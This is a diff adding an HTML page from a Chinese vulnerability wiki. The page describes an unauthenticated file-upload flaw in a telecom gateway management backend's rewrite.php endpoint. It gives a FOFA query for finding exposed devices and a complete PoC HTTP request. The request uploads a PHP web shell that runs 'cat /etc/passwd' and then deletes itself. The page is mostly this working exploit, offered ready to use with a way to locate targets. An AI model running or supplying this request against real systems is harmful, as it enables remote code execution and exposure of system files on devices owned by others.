@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0rewrite.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>电信网关配置管理后台rewrite.php接口存在文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7535\u4fe1\u7f51\u5173\u914d\u7f6e\u7ba1\u7406\u540e\u53f0rewrite.php\u63a5\u53e3\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理后台upload channels.php接口存在文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0ipping.php%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0ipping.php%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理后台ipping.php存在命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="rewritephp">电信网关配置管理后台rewrite.php接口存在文件上传漏洞<a class="headerlink" href="#rewritephp" title="Permanent link">&para;</a></h2>
+<p>电信网关配置管理系统/manager/teletext/material/rewrite.php接口存在文件上传漏洞,未经身份验证的远程攻击者可以利用文件上传漏洞获取系统权限。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>body=&quot;img/login_bg3.png&quot; &amp;&amp; body=&quot;系统登录&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST /manager/teletext/material/rewrite.php HTTP/1.1
+Host: your-ip
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+Connection: close
+
+------WebKitFormBoundaryOKldnDPT
+Content-Disposition: form-data; name=&quot;tmp_name&quot;; filename=&quot;test.php&quot;
+Content-Type: image/png
+
+&lt;?php system(&quot;cat /etc/passwd&quot;);unlink(__FILE__);?&gt;
+------WebKitFormBoundaryOKldnDPT
+Content-Disposition: form-data; name=&quot;uploadtime&quot;
+
+
+------WebKitFormBoundaryOKldnDPT--
+</code></pre></div>
+<p><img alt="image-20240531000747444" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405310007491.png" /></p>
+<p><img alt="image-20240531000810820" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405310008855.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理后台upload channels.php接口存在文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0ipping.php%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0ipping.php%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理后台ipping.php存在命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
